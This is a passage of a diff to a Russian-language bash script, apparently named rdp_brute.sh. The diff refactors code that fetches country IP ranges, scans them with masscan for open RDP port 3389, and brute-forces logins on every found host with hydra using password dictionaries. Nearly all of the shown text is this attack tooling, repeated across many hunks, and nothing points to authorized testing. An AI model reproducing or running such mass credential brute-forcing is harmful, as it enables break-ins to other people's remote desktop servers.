 if [ "$country" = "37" ]; then
 curl http://ipdiapazon.16mb.com/Cayman_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
@@ -3032,6 +1394,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3041,53 +1404,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3105,6 +1422,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3114,53 +1432,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3178,6 +1450,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3187,53 +1460,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3251,6 +1478,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3260,53 +1488,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3324,6 +1506,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3333,53 +1516,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3397,6 +1534,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3406,53 +1544,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3470,6 +1562,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3479,53 +1572,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3543,6 +1590,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3552,53 +1600,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3616,6 +1618,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3625,53 +1628,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3689,6 +1646,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3698,53 +1656,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3762,6 +1674,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3771,53 +1684,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3835,6 +1702,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3844,53 +1712,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3908,6 +1730,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3917,53 +1740,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -3981,6 +1758,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -3990,53 +1768,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
